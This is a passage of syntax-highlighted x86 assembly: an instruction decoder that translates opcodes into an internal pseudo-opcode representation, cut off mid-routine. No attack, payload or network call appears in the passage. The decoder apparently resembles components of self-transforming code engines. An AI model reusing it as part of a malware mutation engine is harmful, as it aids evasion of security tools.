                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

        </span><span class="sc5">@@Gen_8b_RegMem</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the OP Reg,Mem</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Check first if it's OP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_8b_ReglReg</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Ah</span><span class="sc0">       </span><span class="sc1">; MOV Reg8,Mem8?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_8b_RegMem_0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">82h</span><span class="sc0">   </span><span class="sc1">; Set MOV Reg8,Mem8</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">     </span><span class="sc1">; Jump to decode the memory address</span><span class="sc0">
        </span><span class="sc5">@@Gen_8b_RegMem_0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0">       </span><span class="sc1">; Get the operation and set it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">

        </span><span class="sc5">@@Gen_8b_MemReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">      </span><span class="sc1">; Check if it's OP Mem,Reg</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen_8b_lRegReg</span><span class="sc0"> </span><span class="sc1">; If it is, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">      </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84h</span><span class="sc0">       </span><span class="sc1">; If it's TEST...</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_8b_MemReg_0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">83h</span><span class="sc0">   </span><span class="sc1">; ...set it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_8b_MemReg_0</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 86h     ; This is XCHG 8 bits, but it's disabled</span><span class="sc0">
</span><span class="sc1">;                 jnz   @@Gen_8b_MemReg_1 ; because we don't use this type of</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 48h+86h    ; instructions</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_8b_MemReg_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">88h</span><span class="sc0">       </span><span class="sc1">; Check if it's MOV Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen_8b_MemReg_2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">83h</span><span class="sc0">   </span><span class="sc1">; Set it if it's MOV Mem,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">
        </span><span class="sc5">@@Gen_8b_MemReg_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">       </span><span class="sc1">; Get the OP</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenMem</span><span class="sc0">     </span><span class="sc1">; Set it and jump to decode the memory</span><span class="sc0">
                                       </span><span class="sc1">; reference</span><span class="sc0">

        </span><span class="sc5">@@Gen_8b_lRegReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc1">; Decode the OP Reg8,Reg8 opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set the 8 bits operation</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenlRegReg</span><span class="sc0">  </span><span class="sc1">; Decode the rest of the instruction</span><span class="sc0">

        </span><span class="sc5">@@Gen_8b_ReglReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc1">; Decode the OP Reg8,Reg8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set 8 bits instruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_GenReglReg</span><span class="sc0">  </span><span class="sc1">; Decode the rest of the instruction</span><span class="sc0">

        </span><span class="sc5">@@Gen_UsingAL</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the operation</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the Imm</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Extend the sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Gen_UsingAL_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
          </span><span class="sc5">@@Gen_UsingAL_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Increase EIP and set the value</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Gen_SetValue</span><span class="sc0">

        </span><span class="sc5">@@Gen_UsingEAX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Set the value</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

        </span><span class="sc5">@@Gen_SetValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Set the register (EAX)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">


</span><span class="sc1">;;;; INC Reg</span><span class="sc0">

    </span><span class="sc5">@@Op_INC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; Get the register of the INC</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Pseudoopcode (ADD)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Op_GenINCDEC</span><span class="sc0">

</span><span class="sc1">;;;; DEC Reg</span><span class="sc0">

    </span><span class="sc5">@@Op_DEC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; Get the register of the DEC</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">      </span><span class="sc1">; Pseudoopcode (SUB)</span><span class="sc0">
         </span><span class="sc5">@@Op_GenINCDEC</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set the pseudoopcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set the value of addition/subtraction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; PUSH Reg &amp; POP Reg</span><span class="sc0">

  </span><span class="sc5">@@Op_PUSHPOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">        </span><span class="sc1">; Get the register of the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">      </span><span class="sc1">; Get the instruction (PUSH or POP)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set it</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; PUSH Value</span><span class="sc0">

  </span><span class="sc5">@@Op_PUSHValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Set the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; Add the length of the instr. to the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">

</span><span class="sc1">;;;; PUSH SignedValue</span><span class="sc0">

  </span><span class="sc5">@@Op_PUSHSignedValue</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">68h</span><span class="sc0">     </span><span class="sc1">; Set the opcode 68h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the value to PUSH</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Extend the sign</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Op_PUSHSignedValue_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc1">;movsx   eax, byte ptr [esi+1]</span><span class="sc0">
         </span><span class="sc5">@@Op_PUSHSignedValue_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Set the value</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">


</span><span class="sc1">;;;; GENERIC OPCODE (2nd part)</span><span class="sc0">
</span><span class="sc1">;; This opcodes are the 80h-83h ones, which are used for "OP [Mem],Value" or</span><span class="sc0">
</span><span class="sc1">;; "OP Reg,Value". Moreover, opcodes 84-85 are also decoded here (the ones that</span><span class="sc0">
</span><span class="sc1">;; make TEST).</span><span class="sc0">
      </span><span class="sc5">@@GenericOpcode2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Get if it's a 8 bits or 32 bits operation</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen2_8b</span><span class="sc0">    </span><span class="sc1">; Jump if it's 8 bits</span><span class="sc0">
      </span><span class="sc5">@@Gen2_32b</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get the operation performed</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Set it as pseudoopcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">          </span><span class="sc1">; Get if the operation uses a DWORD or</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; a sign-extended byte</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Gen2_Gen_Signed</span><span class="sc0">
      </span><span class="sc5">@@Gen32Value</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get it we use Reg,Reg</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Gen2_32b_Register</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">; Set OP Mem,Imm</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">        </span><span class="sc1">; Decode the memory construction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
